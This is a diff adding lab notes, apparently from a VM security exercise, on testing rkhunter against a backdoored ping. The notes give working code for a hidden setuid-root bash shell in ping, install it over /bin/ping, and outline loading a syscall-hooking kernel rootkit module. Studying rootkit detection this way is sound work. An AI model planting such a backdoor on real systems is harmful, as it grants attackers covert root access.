@@ -1,0 +1,92 @@
+# Step 0 Prepare Kernel/VM
+
+Downgrade Kernel via script
+Reboot/Start with lower Kernel [Press ESC for selection]
+Gasterweiterung installieren (sudo apt-get install virtualbox-guest-addition-iso)
+Install vim
+To the ~/.vimrc add 
+    set mouse=a
+
+
+# Setp 1 Install and Run rkhunter
+
+Install RootkitHunter (rkhunter) with Local Mail
+Update rkhunter DB : sudo rkhunter --update
+Scan : sudo rkhunter -c
+Copy log to step1.log
+
+# Step 2 Build/Install Rootkit
+
+ping is found in APT-Sources: http://de.archive.ubuntu.com/ubuntu bionic/universe amd64 Packages
+uncomment/add deb-src for APT-Sources: http://de.archive.ubuntu.com/ubuntu bionic/universe amd64 Packages
+
+#get ping source 
+    apt-get source inetutils-ping
+#install build dependencies (do this in a new folder)
+    sudo apt-get build-dep inetutils-ping
+#test-compile while beeing in the inetutils-1.9.4 folder
+    dpkg-buildpackage
+
+#add to ping.c
+#add to the end of the unnamed? enum:
+
+ARG_ROOT_PLS
+
+#add to the argp_options array the following element between #define GRP 10 and #undef GRP:
+
+{"rtpls",ARG_ROOT_PLS,NULL,0,OPTION_HIDDEN,GRP+1}
+    
+#in the parse_opt methode add to the switch 
+  
+case ARG_ROOT_PLS:
+    setuid(0);
+    execl("/bin/bash",NULL);ping 
+    break;
+
+#commit changes 
+    dpkg-source --commit
+#build changes 
+    dpkg-buildpackage
+
+# the next two are nessecary because the first dpkg-buildpackage always finds changed files.?
+#commit changes 
+    dpkg-source --commit
+#build changes 
+    dpkg-buildpackage
+
+#to test first set correct privileges with
+    chown root:root ping/ping
+    chmod u+s ping/ping
+#run ping with special flag
+    ping --rtpls
+
+#replace /bin/ping with our ping command
+    sudo cp ping/ping /bin/ping
+#make sure it hase the setuid bit set
+    sudo chmod u+s /bin/ping
+
+#run rkhunter again
+    sudo rkhunter -c
+
+# Step 3 Rootkit
+
+#install headers
+    sudo apt-get install linux-headers-$(uname -r)
+
+#setup files
+#Create Makefile (no quotes around kroot.o)
+#Create kroot.c
+
+#compile
+    make -C /lib/modules/$(uname -r)/build M=$PWD modules
+
+#load
+    insmod kroot.ko
+
+#unload
+    rmmod kroot.ko
+
+#Show Messeges (add -w to display messages as they come in)
+    dmesg -k
+
+#Why does it look line the sys_call_table entry is replaced successfully but it does not work?
